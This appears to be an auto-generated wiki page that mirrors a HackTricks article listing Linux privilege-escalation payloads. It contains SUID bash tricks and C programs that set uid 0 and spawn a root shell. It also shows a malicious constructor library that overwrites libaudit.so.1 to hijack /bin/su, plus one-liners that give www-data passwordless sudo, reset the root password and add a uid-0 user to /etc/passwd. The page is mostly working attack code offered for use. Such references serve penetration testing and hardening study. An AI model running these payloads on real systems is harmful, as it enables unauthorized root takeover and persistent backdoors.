---
parsed_by: focuslocust
source: hacktricks
type: generated
---
# Payloads to execute

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `hacktricks` |
| Type | `hacktricks-topic` |
| Record ID | `hacktricks-linux-hardening-privilege-escalation-payloads-to-execute` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/hacktricks/src/linux-hardening/privilege-escalation/payloads-to-execute.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

bash

## Preserved Body

````markdown
## Bash

```bash
cp /bin/bash /tmp/b && chmod +s /tmp/b
/bin/b -p #Maintains root privileges from suid, working in debian & buntu
```

## C

```c
//gcc payload.c -o payload
int main(void){
    setresuid(0, 0, 0); //Set as user suid user
    system("/bin/sh");
    return 0;
}
```

```c
//gcc payload.c -o payload
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

int main(){
    setuid(getuid());
    system("/bin/bash");
    return 0;
}
```

```c
// Privesc to user id: 1000
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>

int main(void) {
    char *const paramList[10] = {"/bin/bash", "-p", NULL};
    const int id = 1000;
    setresuid(id, id, id);
    execve(paramList[0], paramList, NULL);
    return 0;
}
```

## Overwriting a file to escalate privileges

### Common files

- Add user with password to _/etc/passwd_
- Change password inside _/etc/shadow_
- Add user to sudoers in _/etc/sudoers_
- Abuse docker through the docker socket, usually in _/run/docker.sock_ or _/var/run/docker.sock_

### Overwriting a library

Check a library used by some binary, in this case `/bin/su`:

```bash
ldd /bin/su
        linux-vdso.so.1 (0x00007ffef06e9000)
        libpam.so.0 => /lib/x86_64-linux-gnu/libpam.so.0 (0x00007fe473676000)
        libpam_misc.so.0 => /lib/x86_64-linux-gnu/libpam_misc.so.0 (0x00007fe473472000)
        libaudit.so.1 => /lib/x86_64-linux-gnu/libaudit.so.1 (0x00007fe473249000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fe472e58000)
        libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fe472c54000)
        libcap-ng.so.0 => /lib/x86_64-linux-gnu/libcap-ng.so.0 (0x00007fe472a4f000)
        /lib64/ld-linux-x86-64.so.2 (0x00007fe473a93000)
```

In this case lets try to impersonate `/lib/x86_64-linux-gnu/libaudit.so.1`.\
So, check for functions of this library used by the **`su`** binary:

```bash
objdump -T /bin/su | grep audit
0000000000000000      DF *UND*  0000000000000000              audit_open
0000000000000000      DF *UND*  0000000000000000              audit_log_user_message
0000000000000000      DF *UND*  0000000000000000              audit_log_acct_message
000000000020e968 g    DO .bss   0000000000000004  Base        audit_fd
```

The symbols `audit_open`, `audit_log_acct_message`, `audit_log_acct_message` and `audit_fd` are probably from the libaudit.so.1 library. As the libaudit.so.1 will be overwritten by the malicious shared library, these symbols should be present in the new shared library, otherwise the program will not be able to find the symbol and will exit.

```c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

//gcc -shared -o /lib/x86_64-linux-gnu/libaudit.so.1 -fPIC inject.c

int audit_open;
int audit_log_acct_message;
int audit_log_user_message;
int audit_fd;

void inject()__attribute__((constructor));

void inject()
{
    setuid(0);
    setgid(0);
    system("/bin/bash");
}
```

Now, just calling **`/bin/su`** you will obtain a shell as root.

## Scripts

Can you make root execute something?

### **www-data to sudoers**

```bash
echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
```

### **Change root password**

```bash
echo "root:hacked" | chpasswd
```

### Add new root user to /etc/passwd

```bash
echo hacker:$((mkpasswd -m SHA-512 myhackerpass || openssl passwd -1 -salt mysalt myhackerpass || echo '$1$mysalt$7DTZJIc9s6z60L6aj0Sui.') 2>/dev/null):0:0::/:/bin/bash >> /etc/passwd
```
````

## Source Verification

[source record](../../sources/hacktricks/payloads-to-execute.md)

## Evidence Excerpt

````text
_body: "# Payloads to execute\n\n{{#include ../../banners/hacktricks-training.md}}\n\n## Bash\n\n```bash\ncp /bin/bash /tmp/b\
\ && chmod +s /tmp/b\n/bin/b -p #Maintains root privileges from suid, working in debian & buntu\n```\n\n## C\n\n```c\n//gcc\
\ payload.c -o payload\nint main(void){\n    setresuid(0, 0, 0); //Set as user suid user\n    system(\"/bin/sh\");\n   \
\ return 0;\n}\n```\n\n```c\n//gcc payload.c -o payload\n#include <stdio.h>\n#include <unistd.h>\n#include <sys/types.h>\n\
\nint main(){\n    setuid(getuid());\n    system(\"/bin/bash\");\n    return 0;\n}\n```\n\n```c\n// Privesc to user id:\
\ 1000\n#define _GNU_SOURCE\n#include <stdlib.h>\n#include <unistd.h>\n\nint main(void) {\n    char *const paramList[10]\
\ = {\"/bin/bash\", \"-p\", NULL};\n    const int id = 1000;\n    setresuid(id, id, id);\n    execve(paramList[0], paramList,\
\ NULL);\n    return 0;\n}\n```\n\n## Overwriting a file to escalate privileges\n\n### Common files\n\n- Add user with password\
````
